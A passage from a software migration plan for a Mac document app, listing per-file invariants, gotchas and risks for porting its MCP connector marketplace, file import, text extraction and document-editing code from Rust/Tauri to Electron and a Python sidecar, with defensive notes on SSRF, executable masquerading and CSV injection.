Connector marketplace: search the official MCP registry (registry.modelcontextprotocol.io/v0.1/servers, server-side `search` param), normalize records (both current wrapped/camelCase and legacy unwrapped/snake_case shapes) into CatalogEntry cards with a local-first InstallSpec + optional cloud alternative, verify publisher-owns-repo, inline icons as data: URIs through an SSRF-checked client in bounded waves of 6, all behind an explicit per-Mac opt-in flag (the app's only 'phone home').

**Replacement:** TS in Electron main: three ipcMain handlers; fetch via undici with 45s timeout + 2 retries with backoff; normalize_servers and all its helpers are pure JSON functions that port 1:1 with their vitest tests; icon fetches through an undici client whose per-hop redirect handling re-runs the public-address check (redirect:'manual' loop capped at 10), inlined as data: URIs (renderer CSP still blocks remote images); opt-in flag file in userData.

**Must preserve:**
- Opt-in gated: browsing errors with the exact 'reaches the internet' message when off (the frontend keys its opt-in gate off that error); the flag lives per-Mac in the app data dir, never in a room; turning it off DELETES the file
- Install has NO privileged path: the frontend expands InstallSpec into a standard mcpServers fragment and calls mcp_apply_config, so the SEC-1 fingerprint gate fires for marketplace installs too
- PRIVACY FIRST install derivation: a record offering both a local package and a remote endpoint gets the LOCAL one as primary and the remote as alt_install ('use the cloud version') — this deliberately reversed an earlier remote-first choice that installed dead hosted endpoints over working local packages
- Normalization tolerates both registry schemas (wrapped {server:{...}} camelCase AND legacy unwrapped snake_case); records with no derivable install are SKIPPED not fatal; duplicate ids (one per published version) dedupe to the first; generic names ('mcp','server',...) display the publisher instead
- verified = the namespace owner equals the source-repo owner (io.github.microsoft/* published from github.com/microsoft/*) — the registry's only real trust signal
- Remote URLs are validated (http/https + host) before install: registry records are stranger text and one malformed url blanked the whole window via the drawer's new URL()
- Icon URLs are attacker-chosen: literal private-address check before fetch AND re-run on every redirect hop (delegating to the default policy keeps the 10-hop ceiling); content-type must be image/*, ≤300KB, inlined as data: URI; fetches go out in waves of ICON_CONCURRENCY=6 (200 simultaneous connections to 200 strangers each seeing the user's IP was the bug) and each icon must stay with ITS OWN listing
- InstallSpec serialization is camelCase INCLUDING variant fields (envKeys/headerKeys) — serde's enum rename_all does not reach fields, and snake_case leakage made the drawer crash on undefined; registryType mapping: pypi→uvx, oci/docker→docker run -i --rm, default→npx -y, runtimeHint wins
- Server-side search via the `search` query param (the catalog is many pages; client-side filtering of one page missed most matches); no query → newest `limit` (default 80, cap 200)

**Gotchas:**
- Registry latency is real: production reads take 20–45s — keep the 45s timeout and the 2-attempt retry or the marketplace looks dead during load spikes; use the frozen /v0.1/ API, not the preview route (test-pinned)
- The icon redirect check must run per hop inside the client, not once up front — undici gives you this only with manual redirect handling; a hostname resolving privately still gets through the literal check (documented residual risk here; the heavier DNS-pinning guard was deemed unreachable from a sync redirect policy)
- Two #[ignore] live-network tests exist (live registry normalization, yahoo search) — port them as opt-in integration tests; they caught a zero-entries normalization regression

**Native/Tauri surface:** tauri::command / AppHandle; tauri::Manager::app_data_dir (opt-in flag file); reqwest use_rustls_tls (registry is HTTP/2-only; native-tls ALPN failed) with custom redirect Policy for icons

### `src-tauri/tests/mcp_client.rs` — 139 LOC → electron-main (0.5 d)

End-to-end test of the stdio MCP client against an inline fake Python server (python3 -c) speaking initialize/tools/list/tools/call, deliberately emitting a stray notification and a non-JSON stdout log line the client must skip; plus clean-failure cases (missing command, immediate exit with stderr surfaced) and an ignored live duckduckgo-mcp-server test.

**Replacement:** Port as a vitest integration test spawning the same inline python3 fake server (or an equivalent node -e fake) against the TS client wrapper; keep the stray-notification + stdout-noise + isError-to-throw + stderr-in-error assertions verbatim, and keep the ignored/opt-in live uvx test.

**Must preserve:**
- Client must skip non-JSON stdout lines and stray notifications during the handshake
- isError tool results surface as errors carrying the server's text ('it broke')
- A missing command fails with 'Could not start ...'; a server that exits immediately reports its stderr ('boom: missing dependency') in the connect error
- The live duckduckgo test is #[ignore] (needs uv + internet) — the shipped default config's real-world smoke test

**Gotchas:**
- If you adopt the SDK's StdioClientTransport, the stdout-noise tolerance and stderr surfacing are the two behaviors to verify against it explicitly — the SDK's ReadBuffer throws on non-JSON lines in some versions, which would fail real servers that log to stdout

**Native/Tauri surface:** tokio::test, python3 child process

**Subsystem risks:**
- room_mcp.rs is the security boundary for EVERY engine tier — a scope leak in the TS port (one wrong matches! equivalent) silently hands job/UI/connector tools to cloud advisors or external agents. The ~1,265 lines of tier tests must be ported first and treated as the acceptance gate, and the port cannot start until exec_tool/tools_catalog/redaction land in TS (hard sequencing dependency on the commands and privacy subsystems).
- SSRF regression is the single most likely rewrite-introduced vulnerability: mcp_oauth and mcp_registry rely on literal checks + DNS resolution/pinning + hand-computed re-guarded redirects. Node fetch/undici follow redirects and resolve DNS at connect by default; a naive fetch() port reopens DNS-rebinding and redirect-to-loopback against every connector-chosen URL. The web::check_public_http_url / resolve_public_addr guard must be ported as a shared TS module BEFORE any of these files.
- Consent semantics are owner decisions, not implementation details: auto-approve vs outbound-unmask stay separate powers, per-connector overrides inherit via Option-not-bool, absent-file-fails-closed, persist-before-flip, name-keyed grants forgotten on removal/retarget, destructive-delete cards bypass all standing consent. Any 'simplification' here is a regression against 2026-08-03 owner decisions.
- The .room migration must decide the fate of three MCP-adjacent stores: the config text (fingerprint approvals hash exact bytes — reformatting re-prompts every room; silent auto-approval is unacceptable), oauth:* token settings (dropping them signs every remote connector out), and per-Mac files (approvals, flags, connector powers) which must move Tauri app_data_dir → Electron userData or every consent decision is lost/re-granted.
- Adopting @modelcontextprotocol/sdk wholesale loses hard-won behaviors: WWW-Authenticate capture for the sign-in-vs-bad-token message, stdout-noise tolerance, stderr-tail error surfacing, the bounded image flattening, the Rejected-vs-Unreachable refresh split, and the body-cap-before-auth ordering on the server side. Use the SDK for transport plumbing, keep the app's policy layer hand-ported with its tests.
- Electron main GUI processes get the same bare macOS PATH as Tauri — without the login-shell PATH fix (plus prepending the app's downloaded-runtime cache dir), every uvx/npx stdio connector fails to spawn on end-user machines while working in dev.
- Connection carry-over (config_key) and the generation counter prevent connector-restart storms and stale-connect races; both are easy to drop in a 'clean' rewrite and their absence only shows as seconds of 'connecting…' plus lost sessions on every settings change — port them and their tests deliberately.
- run_mcp_tool's annotations (destructiveHint:false) and preserved connector annotations are load-bearing for non-interactive Codex clients; changing them makes Codex-engine rooms refuse all connector calls with no visible cause.

## 7. Documents & extraction

Documents-extraction subsystem: the entire "what is this file and what does it say" pipeline of Arcelle. ~13.6k lines of Rust across 29 files. Three layers: (1) pure extractors (src-tauri/src/extraction.rs + extraction/ dir) that turn bytes of ~40 formats into indexable text with hard-won correctness invariants (encoding detection with provenance, RTF/legacy-Office native readers, visual-Hebrew RTL repair, PDF quality judging, decompression-bomb caps, panic containment); (2) macOS-native rendering/recognition (ocr.rs Vision OCR with PDF rasterization, quicklook.rs QuickLook thumbnails, office.rs textutil HTML + pptx slide-reorder trick); (3) file-lifecycle commands (files.rs import/download/trash/content funnels with OCR/STT job lanes and epoch pinning, spreadsheet/docx in-place editing that preserves formatting, library/folders/memories, recents, organize batch verbs, generated-doc HTML templating, deterministic cast/script parsers). 36 tauri commands. Rewrite splits: extractors + OCR/QuickLook/textutil + edit matchers go to the Python sidecar (PyObjC for Vision/QuickLook is explicitly allowed); DB-touching command funnels, format registry, and HTML templating go to Electron main in TS. The dominant risk is silent parity drift: every extractor's output IS the search index and the model's view of the room, and dozens of comments document one-line invariants that fixed live-QA failures — these must be treated as a spec, with golden-fixture diff tests against the Rust output before cutover.

### `src-tauri/src/commands/files.rs` — 1647 LOC → electron-main (5 d)

The file-lifecycle core: import_files (blocking worker, per-file progress events, dedup by identical bytes, 1GB blob ceiling, folder refusal, MarkItDown fallback, OCR/STT/degraded-PDF queueing), import_download (executable-masquerade detection + rename-to-.bin), the OCR/STT single-thread job lanes with room-epoch pinning and STT progress probes, get_file_content (viewer payload: media tokens, streaming, encoding-aware raw text, web_meta), decode_file_text (encoding strip/override), store_file_bytes (snapshot+overwrite as ONE transaction), trash/restore/delete-permanently/empty-trash, save_generated_file, import_link/import_web_source funnels (YouTube captions, readable pages, binary fallback), rename_file.

**Replacement:** The heart of Electron main: better-sqlite3-multiple-ciphers for the DB, an async import queue (worker_threads or just sequential awaits) calling the sidecar for extraction/OCR/STT, webContents.send for the seven event channels, a protocol.handle('roommedia') stream with Range support replacing stage_media_bytes, and the web funnels calling main's fetch layer.

**Must preserve:**
- 1GB MAX_IMPORT_BYTES checked via stat BEFORE reading (SQLite's blob ceiling; a huge file used to make the app vanish with no message); dropped folders refused in human language; identical bytes refused with the existing file's name
- import-progress events per file (done/total/name) plus a terminal receipt with imported/failed counts; room-files-changed emitted after multi-file imports (Home counts/Scripts index listened and stayed stale)
- dangerous_content_mismatch: ELF/PE/Mach-O(4 orders)/CAFEBABE/shebang bytes wearing an inert extension get renamed '(blocked - not really a .pdf).bin', skip extraction ENTIRELY (MarkItDown would read the still-on-disk temp under its misleading extension), and store no text — but extensions already declaring themselves executable are left alone
- OCR queued not just for empty text but for DEGRADED PDF text (pdf_quality) — 'no text at all' was never the only failure; job lanes are single-threaded mpsc drains (30 scans run one at a time, not 30 concurrent multi-hundred-MB passes)
- JobMeta carries room_path AND epoch: a job queued before a rollback must not write into the swapped room (path alone passes — a rollback keeps the path); read_job_bytes/read_job_text re-check both under the lock; OCR result goes through choose() and a no-improvement result emits 'none' not 'done'
- STT_PENDING/STT_CURRENT expose lane state because the channel has no observable depth and retranscribe never reaches the jobs table — the agent's only way to verify 'done'
- store_file_bytes: version snapshot + overwrite are ONE transaction — separately, a failed overwrite cut a duplicate version and evicted the oldest snapshot while reporting nothing saved
- get_file_content: media and parsed-bytes viewers get roommedia:// stream tokens (the base64-over-IPC 50MB cliff is deliberately gone); raw text decodes through the SAME decode_stored_text the encoding strip uses (one reading, not two); lossy decode shuts the editor (saving U+FFFD over real bytes); recording/video/audio kinds resolved via rec-meta presence
- Trash is the only UI-reachable delete without second confirmation (owner decision: 'ask before AI edits' is OFF, trash+attribution is the compensating control); delete_file_permanently refuses non-trashed rows so destruction is always a second act; live recordings into a row are stopped before trash/delete
- import_link obeys the room's internet switch even as an explicit user action; import_link_impl is module-PRIVATE so no caller can reach the un-scanned write (a saved page skipping the privacy scan leaked names to cloud engines on the next turn); every save path owes auto-index + privacy scan + room-files-changed
- import_web_source: YouTube→captions (YT_NO_CAPTIONS sentinel drives the download-and-transcribe fallback), readable page→markdown with origin_url recorded, everything else→binary funnel
- link_file_name folds reserved chars, 80-char cap, never empty

**Gotchas:**
- The epoch/path double-pin and the lock-drop-before-enqueue ordering are concurrency invariants with no test harness pointing at them — easiest thing to silently lose in an async TS rewrite
- Electron protocol.handle must implement HTTP Range for the media tokens or seeking breaks; staged map is cleared on room lock
- Event names (room-files-changed, import-progress, ocr-progress, stt-progress, agent-open-file, file-updated) are frontend contract — keep verbatim
- content_text/clip_preview symmetry: version-compare clips BOTH sides identically or truncation tails show as phantom diffs
- web::MAX_DOWNLOAD_BYTES vs MAX_IMPORT_BYTES are different caps on different inlets — don't unify

**Native/Tauri surface:** tauri::command, tauri::AppHandle, tauri::Manager, State, tauri::Emitter, tauri::async_runtime::spawn_blocking; std::fs metadata/read (import paths); roommedia:// custom protocol (via stage_media_bytes, defined elsewhere)

### `src-tauri/src/extraction.rs` — 1406 LOC → python-sidecar (4 d)

Root of the extraction module: extract_text() dispatch by extension for ~40 formats, text-encoding detection with provenance (BOM/UTF-8/detected/chosen), the shared edit-normalization fold table, native RTF/EPUB/iWork readers, HTML entity decoding, zip-entry reading with bomb caps, MarkItDown CLI fallback with timeout, whitespace normalization.

**Replacement:** Python module in arcelle_sidecar: dispatch table + per-format readers; encoding via chardetng-py or charset-normalizer wrapped in a WHATWG-name shim so reported names match encoding_rs ('windows-1254' not 'cp1254'); zipfile for EPUB/iWork/zip entries with the same 100MB inflate cap; RTF tokenizer ported line-for-line (striprtf loses the cp1252 high band and \uc handling, so port the hand parser).

**Must preserve:**
- Decode order is a contract: BOM wins outright (fact), then strict UTF-8 (fact), then detection (guess) on a 64KB sample with ISO-2022-JP and UTF-8 denied; EncodingSource provenance is surfaced to the viewer strip
- decode_text_as re-reads ORIGINAL bytes with BOM handling deliberately OFF (the override overrules what bytes appear to say); unknown labels refuse rather than guess; ENCODING_CHOICES entries are canonicalised through for_label so picker name == reported name
- Extension-less files (README, LICENSE, Makefile) are sniffed on bytes but ONLY facts accepted (BOM or clean UTF-8, no NULs) — the detector guessing here would index every binary as mojibake
- contain_parser_panic wraps every third-party reader: a malformed file costs only its own text, never a poisoned room lock (regression: JoinError + poisoned mutex took down every later room op)
- fold_edit_char is THE ONE normalization table shared by plain-text and docx edit matchers: curly quotes→straight, dash family→hyphen, fi/fl ligatures→byte-safe pairs, NUL dropped (it is the docx paragraph sentinel — matching it panicked at edits[usize::MAX]), NO lowercasing (edits rewrite bytes, case must stay exact)
- HTML import indexes the ARTICLE (Readability) with strip_html as fallback — a page whose nav/footer reached the index answered searches with its own navigation
- RTF reader decodes \'xx via cp1252 (0x80-0x9F band is NOT Latin-1) and \uN with \ucN fallback skipping; skips fonttbl/colortbl/stylesheet/info/pict groups whole; unknown codepages emit a space to keep word boundaries
- iWork bundles read ONLY through their QuickLook/Preview.pdf entry (suffix-matched, both flat and packaged spellings); no preview = None, never raw IWA protobuf
- EPUB chapters follow OPF spine order, name order as fallback; shared aggregate byte budget
- decode_basic_entities is single-pass so double-decoding is structurally impossible (&amp;lt; must stay &lt;); numeric refs (&#8212;, &#x2014;) decode; unknown entities kept verbatim; 12-char scan window so bare & never swallows a paragraph
- normalize_whitespace collapses tabs — any extractor wanting column structure must emit ' | ' (xlsx does)
- strip_tags is quote-aware inside tags (Parsoid data-mw attributes carry JSON with embedded > )
- MarkItDown fallback: probed at 4 explicit paths (GUI apps don't inherit shell PATH), 180s deadline with stdout drained on a thread, TimedOut aborts all candidates
- CSV/TSV raw text reaches the index EXACTLY as written — no unquoting, no reflow (a reader must find the literal '=SUM(A1:A2)')

**Gotchas:**
- chardetng and charset-normalizer will disagree on some ambiguous single-byte files; the hand-rolled scoring approach was tried and REJECTED (comment documents it reading Turkish as windows-1250) — do not substitute a naive heuristic
- Python codec names differ from WHATWG names; the picker/strip round-trip (menu row == reported encoding string) breaks without a name-mapping layer
- Python has no catch_unwind equivalent for native-extension crashes: pypdfium2/lxml segfaults kill the whole sidecar process — consider subprocess isolation for parsers of untrusted bytes
- The fold table serves matchers that may land in a different language/layer — port it exactly once and import it everywhere, or edits will corrupt documents
- zip declared sizes can lie; the take(cap+1) re-count of actual inflated bytes is the real guard, the header check only a fast path

### `src-tauri/src/commands/organize.rs` — 810 LOC → electron-main (2 d)

The File agent's batch organize verbs (no tauri commands — called from agent.rs tool dispatch): organize() (moves/renames/folder create+remove in one previewable dry_run-able call), trash_named() (deletion as a SEPARATE tool name so lane labels/tier gates/logs treat destruction differently), merge() (deterministic concatenation, no model call).

**Replacement:** TS port in main as tool-execution handlers the sidecar's agent invokes over the host-tool channel; keep the OrganizeReport.sentence() receipt wording.

**Must preserve:**
- Name resolution is per-entry best-effort (one hallucinated filename in a plan of thirty must not discard twenty-nine) and carries (index,id,name) OUT of the resolve — the consuming loop renames/moves files, so a second lookup runs against an already-changed DB
- Dedup by resolved ID not by string (q3.pdf and Invoices/q3.pdf are one file), and duplicates are REPORTED not silently dropped (a silent drop is a receipt claiming the whole plan ran)
- Folder-qualified names resolve via find_file_like_qualified (the list_room_files round trip that silently failed before)
- means_top_level shares move_file's vocabulary (none/top/top level/root//)
- MAX_BULK_FILES cap with the overflow counted in the report; dry_run previews every branch
- Agent has trash, NEVER delete_file or empty_trash — the model may tidy, only a person may destroy (module header states this as the design)

**Gotchas:**
- merge is deterministic concatenation and the tool description distinguishes it from AI synthesis — keep that wording so the model can tell them apart

### `src-tauri/src/commands/docs_html.rs` — 772 LOC → electron-main (1.5 d)

Generated-document infrastructure: note_mime/create_note, the canonical Scratch pad (get-or-create by exact name, adopts user-made pads), save_and_open funnel (Artifact commit + room-files-changed + agent-open-file events), html_document wrapper with NOTEBOOK_CSS+DOC_STYLE inlined (the one deliberate duplicate of tokens.css), doc_hero/file_glyph/title helpers, refs_context (whole-file inclusion for generators), name_from_topic path-safe naming, extract_md_table.

**Replacement:** TS module in main beside the DB/Artifact layer; the CSS constants move with it (or better: generate both tokens.css and this constant from one source file at build time, killing the hand-mirror); open_scratch_pad stays an IPC command.

**Must preserve:**
- Generated output goes through the Artifact staging funnel so a re-run becomes a new VERSION of the same file, not an indistinguishable twin ('Flashcards - clean-code.html' x2 with different decks, live QA 2026-08-03); names colliding with a PERSON'S file still step via available_name and are never versioned over
- save_and_open must emit BOTH events (sidebar reload AND viewer open); room lock held only for the insert
- Scratch pad matcher accepts exact stem any-case, bare or .md ONLY — a deliberate 'Scratch pad.html' is never hijacked
- html_document returns full-page input unchanged (is_full_html_doc) and otherwise wraps with inline styles because the roomdoc:// origin has default-src 'none' CSP — pages cannot read app stylesheets, values must be literals
- NOTEBOOK_CSS mirrors src/styles/tokens.css BY HAND — the comment pair is the whole defence; a test asserts every var() the templates read is defined
- refs_context keeps every referenced file WHOLE (its .min(6000) clip was the '#minutes only does 5 minutes' bug, memory: hash-commands)

**Gotchas:**
- The tokens.css mirror is the known drift trap — the rewrite is the one chance to make it build-generated
- Consumers of these helpers (studios, summarize, #commands) live in other subsystems; keep signatures stable or coordinate

**Native/Tauri surface:** tauri::command, State, tauri::Emitter

### `src-tauri/src/extraction/legacy.rs` — 722 LOC → python-sidecar (3 d)

Pre-2007 Office readers: .doc via textutil (with structural gates) falling back to a printable-run sweep of the WordDocument OLE stream; .ppt via a hand-written PowerPoint-97 record-tree walker (text atoms per slide/notes, masters skipped); .xls/.ods via calamine.

**Replacement:** Python: textutil shell-out with the SAME two gates ported; olefile (pure-python, standard) replaces the hand OLE reader; the ppt record walker ports directly (RT_TEXT_CHARS/RT_TEXT_BYTES atoms, depth cap 24); python-calamine (prebuilt wheels, same underlying crate) for .xls/.ods so cell rendering matches the xlsx reader's layout.

**Must preserve:**
- TWO structural gates before textutil because textutil applies none: OLE magic (D0CF11E0A1B11AE1) required, and is_clean_import rejects answers containing NUL or >1% control chars — handed junk-named-.doc, textutil echoes the raw bytes back cheerfully with exit 0, and any 'which looks longer' score comparison can be WON by the echo (comment documents this)
- .doc order: textutil (the same importer that draws the preview, so screen and index agree) → field-code resolution → run-sweep fallback only when macOS declines, and only from a real WordDocument stream
- .ppt record walker takes text atoms only inside slide/notes containers — text outside any slide (masters' 'Click to edit...' placeholders, document summary) has nowhere to go and is dropped, which is the entire point; notes before any slide are the notes master, skipped; slides numbered [slide N] identically to .pptx
- .xls/.ods: every sheet, tab-joined rows, trailing-zero-free floats (12.0→12), all-empty rows skipped, 8MB cap with announced truncation
- cp1252 for single-byte text atoms; UTF-16LE for wide atoms

**Gotchas:**
- olefile reads streams fine but the FIB is not parsed anywhere — do not be tempted to 'improve' the sweep into a real .doc parser; textutil is the primary path
- python-calamine's Data enum differs slightly from Rust calamine's — pin the float/date rendering with fixtures so search text is identical
- textutil is macOS-only and this sidecar module is the only reason .doc has text at all — the non-macOS fallback story disappears (acceptable, Mac-only app)

**Native/Tauri surface:** shell-out: /usr/bin/textutil (via crate::textutil)

### `src-tauri/src/extraction/article.rs` — 692 LOC → electron-main (2.5 d)

Readability extraction for saved web pages via dom_smoothie: read_page() returns PageMeta (only what the page DECLARED — og:/article:/JSON-LD/lang, never invented) plus ArticleBody in three shapes (HTML for viewer, Markdown for the file, text for search); includes on*-attribute stripping and a custom HTML→Markdown serializer.

**Replacement:** @mozilla/readability (the decided library) over linkedom/happy-dom in Electron main, with a small meta harvester (og:*, JSON-LD, <html lang>) and turndown configured to NOT escape punctuation in prose; sidecar calls into main over the local channel when import needs an article, or the HTML branch of import runs in main before handing text to the indexer.

**Must preserve:**
- Metadata extracted BEFORE parse() consumes the document — a page with no scorable article still declares title/author/date
- Every PageMeta field is Option and empty/whitespace collapses to None (Some("") must never survive); dates kept exactly as the page wrote them, never reformatted
- Articles under 140 chars rejected (caption/paywall stub), caller falls back to whole page
- URL passed to Readability only if absolute http(s) — a malformed URL costs the URL, not the extraction; 50,000-element parse ceiling (crate default is 0 = unbounded)
- strip_event_handlers removes on* attributes: Readability is a content extractor NOT a sanitizer (Mozilla says so), and output lands in a sandboxed HtmlView — a stored reading copy must not carry the site's inline handlers
- html_to_markdown deliberately does NOT escape . " ( ) # in prose — the escaped string is what search chunks and the model reads, and 'disbelief\.' is not the word the page printed
- Whole read wrapped in panic containment; failure = PageCapture{default meta, no article}

**Gotchas:**
- @mozilla/readability needs a DOM; jsdom is heavy and linkedom has fidelity gaps on srcset/base-URL resolution — test relative src/href absolutization against the Rust output
- Turndown's default escaping reproduces exactly the bug this file's serializer was written to avoid — must configure/replace the escaping rules
- web_meta JSON field names (camelCase) are stored in the DB; the port must serialize identically or old rooms' strips go blank

### `src-tauri/src/commands/shotsplit.rs` — 689 LOC → python-sidecar (1.5 d)

Deterministic script splitter for video generation (no tauri commands; called from story.rs): split_script cuts a script into exactly N parts preferring sentence then word boundaries; script_chunks recognizes timed/heading structure; parts_for computes shot count from duration.

**Replacement:** Python port beside the create/story generation flows; keep the reassembly-equals-original property test.

**Must preserve:**
- In plain code NOT a model, for stated reasons: nothing leaves the Mac, and the invariant is exact — reassembled parts contain every word of the original, in order (a model 'drops a sentence it thought was redundant'); a test asserts it
- Always returns exactly the number of parts asked for; sentence boundaries preferred, word fallback when a script has fewer sentences than shots
- Clock/heading/end-matter recognition feeds chunking of pre-structured scripts (MAX_PARTS cap consumed by story.rs)

**Gotchas:**
- Sentence-boundary detection is hand-rolled (is_boundary/read_clock) — port it rather than substituting an NLP splitter, or shot counts change

### `src-tauri/src/commands/spreadsheet.rs` — 618 LOC → electron-main (2.5 d)

Cell editing for csv/tsv/xlsx: A1 parsing with Excel's real ceilings, an RFC-4180 parser that preserves per-field QUOTING and the file's own line-ending/final-newline conventions, sep= directive handling, SheetJS-compatible separator guessing, formula-injection quoting on write, xlsx set_cell via umya; set_cell command wires it to the DB with versioning.

**Replacement:** CSV/TSV logic ports to TS in Electron main (pure string work, and the grid's editor is the caller — keeping it near the DB write avoids a sidecar round-trip); xlsx set_cell goes to the sidecar as a raw-XML sheet splice (change one <c> element in the target sheet part, copy the rest of the zip raw) rather than openpyxl, which drops charts/pivots on rewrite.

**Must preserve:**
- Quoting is MEANING: "=SUM(A1:A2)" is literal text, bare is a formula — each field's original quoted flag rides through the edit and is written back exactly (editing any other cell used to strip quotes and turn labels into sums)
- Written values starting = + - @ get quoted (OWASP CSV-injection set — Excel/Sheets/Numbers import heuristics, not just this app's = )
- Bare CR ends a row (classic Mac 'CSV (Macintosh)' exports) — dropping it fused each line's last field to the next line's first and the next write made it permanent
- File conventions preserved: first line break OUTSIDE quotes decides the newline, trailing-newline presence matched — a one-cell edit must read as a one-line change to git/colleagues
- sep=; header line consumed as configuration, written back verbatim — grid row 1 is the file's second line and editing A1 used to overwrite the directive
- Separator guessed the way SheetJS guesses (counts outside quotes over first 1024 chars, comma>tab>semicolon>pipe tie-break) so the write lands on the cell the grid SHOWED
- A1 ceilings enforced BEFORE the accumulator (XFD/1048576) — a 200-letter column once overflowed into a huge index and took the app down on grid resize
- Non-UTF-8 csv refused with the shared non_utf8_error rather than corrupted

**Gotchas:**
- The separator guess MUST stay bug-compatible with the frontend grid's reader (SheetJS guess_sep) — they are two implementations of one contract
- umya set_cell rewrites the whole workbook (fidelity of everything it models); openpyxl silently drops charts — a raw-XML splice is the only no-loss TS/Python route, and shared-string vs inline-string cell types make it non-trivial

**Native/Tauri surface:** tauri::command, State, tauri::Emitter (room-files-changed, file-updated)

### `src-tauri/src/extraction/html_edit.rs` — 608 LOC → python-sidecar (2.5 d)

Position-preserving HTML text-run scanner for edit_file's HTML branch: decodes entities with per-char byte spans, marks block boundaries with NUL sentinels, matches folded needles across inline tags but never across block closes, and splices edits into raw markup; also scan_headings for outline.

**Replacement:** Python port beside the docx matcher, sharing the one fold table; spans are byte offsets into the raw markup string, entity decode returns (char, bytes-consumed) pairs exactly as here.

**Must preserve:**
- Deliberately NOT built on strip_html (lossy, no offsets); every decoded char traces to the exact source bytes (an &amp; is one char over a 5-byte span)
- BLOCK_CLOSE_TAGS boundaries (p, li, h1-6, tr/td/th, table, blockquote, pre, ...) may never be crossed by a match — splicing two block elements together silently is the failure mode; inline tags (b, i, span, a) may be spanned
- Block sentinel is NUL, which fold_edit_char drops from needles, so a needle can never match across a boundary by construction
- script/style/comment bodies and tag interiors (including attribute values) never become runs
- Entity lookahead capped at 32 chars past &

**Gotchas:**
- strip_html remains the source of the advisory 'closest passage' hint on match failure — two different pipelines on purpose; do not unify them

### `src-tauri/src/extraction/data.rs` — 535 LOC → python-sidecar (1.5 d)

Readers for ipynb (prose+code+outputs in cell order), eml (headers + preferred text/plain alternative, quoted-printable/base64/MIME-word decoding), srt/vtt (cue text without timecodes), svg (title/desc/text labels only), and zip central-directory listings. All best-effort, all capped at 8MB derived chars.

**Replacement:** Python: json for ipynb, stdlib email package (message_from_string + get_body/walk) replaces the entire hand-rolled MIME stack, re-based cue/svg extractors, zipfile.namelist for archives. Cap logic ported as-is.

**Must preserve:**
- Notebook: markdown/raw cells indexed as prose, code cells prefixed [cell N], stream text and text/plain display outputs kept, images/widget JSON skipped; source accepted as string OR line-array (nbformat allows both)
- Mail: only From/To/Cc/Date/Subject headers indexed; multipart prefers text/plain, falls back to stripping the HTML part; base64 blobs must never reach the index
- Subtitles keep words and lose timecodes; SVG indexed by what it SAYS (labels), never path data/coordinates
- push_capped truncates at char boundaries; any failure returns None = 'no text', exactly the pre-feature behavior

**Gotchas:**
- Python email package is more lenient than the hand parser — diff outputs on the test fixtures (folded headers, encoded words, BOM-prefixed messages) to confirm header values match
- sketch extraction (in extraction.rs dispatch) calls into commands::sketchdoc — that dependency lives in another subsystem's inventory

### `src-tauri/src/commands/office.rs` — 449 LOC → python-sidecar (2.5 d)

High-fidelity Office rendering: slide_preview command renders any pptx slide by REWRITING the deck so that slide is first in <p:sldIdLst> (Quick Look only draws page one) with every other zip part raw-copied byte-identical, LRU-ish cache keyed id:index:sha256(bytes); office_html renders .doc/.rtf as formatted HTML via textutil with Word field codes resolved into real anchors.

**Replacement:** Python: the sldIdLst splice (find_tag_body/split_self_closing port) + zipfile raw copy, QuickLook render via the quicklook port, sha-keyed cache dict with oldest-eviction; textutil -convert html shell-out + field-code resolver. Electron main exposes the IPC command and forwards; PNG returned as bytes not base64 if the channel allows.

**Must preserve:**
- Slides are REORDERED never deleted — pruning the other slides' relationships/notes/media invites a file the renderer quietly refuses
- split_self_closing handles the LONG spelling: PowerPoint writes <p:sldId ...><p:extLst>...</p:extLst></p:sldId>, and carrying only the opening tag left the list unbalanced — Quick Look refused the staged file and every slide but the first was undrawable
- Cache key includes the bytes DIGEST because a file id outlives its contents: version restore rewrites bytes under the same id and an id-keyed cache answered with the previous deck's slides
- Eviction drops the OLDEST one at a time — emptying at the ceiling made a long deck re-render every slide including the one just paged back from
- Legacy .ppt (OLE, count 0) treated as a one-page document (max(1)) — Quick Look renders its first slide perfectly, and 'no slides' would throw that away
- Room lock held only for the byte read; render on a blocking worker
- textutil HTML gets field codes resolved (HYPERLINK "url"text was printed mid-prose, link unclickable)

**Gotchas:**
- raw_copy_file preserves compression as-is — Python's zipfile must copy with ZipInfo + raw data (open with force_zip64 care) or media gets recompressed and byte-identity breaks
- crate::textutil (convert + resolve_field_codes, temp-copy hygiene) is a dependency in another file NOT in this inventory list — confirm it is covered by another agent or fold it in here

**Native/Tauri surface:** tauri::command, tauri::AppHandle, tauri::Manager, tauri::async_runtime::spawn_blocking; shell-out: /usr/bin/textutil (via crate::textutil); crate::quicklook (QuickLookThumbnailing)

### `src-tauri/src/extraction/docx.rs` — 448 LOC → python-sidecar (3 d)

Word extraction (document.xml + footnotes/endnotes/comments + discovered headerN/footerN parts, each labelled) and docx_replace_text: the run-split in-place editor that matches text spanning many <w:t> nodes and splices replacements while keeping every other byte of the zip identical.

**Replacement:** Python port operating on document.xml as a raw string (NOT python-docx, which re-serializes and loses fidelity): same scan_docx_text char-map with NUL paragraph sentinels, same fold table import, zipfile raw-copy for untouched entries.

**Must preserve:**
- Extraction reads beyond the body: footnotes/endnotes/comments/headers/footers each appended under a [label] so the model can tell a footnote's small print from the clause it qualifies
- Matcher builds a whitespace-collapsed virtual text stream where each char maps to (node, offset); paragraph boundaries are '\u{0}' sentinels mapped to usize::MAX so no match ever spans two paragraphs
- Chars fold through the shared fold_edit_char table so a docx match tolerates the same curly-quote/NBSP/dash/ligature drift the plain-text matcher does; ligature Pair chars both map to the SAME source char so span math stays boundary-safe
- Replacement lands in the first node (keeping its formatting), remainder of match cleared; returns match count so callers can refuse ambiguous (count>1) rewrites
- Only real <w:t>/<w:t attr> nodes matched — not <w:tab/>; self-closing empties skipped
- Untouched zip entries copied raw, byte-identical

**Gotchas:**
- python-docx or lxml round-tripping re-serializes XML and churns rsids/namespaces — Quick Look and Word both notice; string-splice is the only fidelity-safe approach
- The fold table must be the same object the html_edit and plain-text matchers use — three copies WILL drift
- Escaping on write-back: replacement text must be XML-escaped exactly as encode_xml_text does (& < > only)

### `src-tauri/src/ocr.rs` — 420 LOC → python-sidecar (2.5 d)

On-device OCR via Apple Vision (VNRecognizeTextRequest, accurate level, auto language detection with a 20-language priority list filtered against what the Mac supports); PDFs rasterized page-by-page through CoreGraphics with area (40MP) and per-edge (20k px) caps, 500-page ceiling, and explicit '[only the first N of M pages...]' / unrendered-page notes appended.

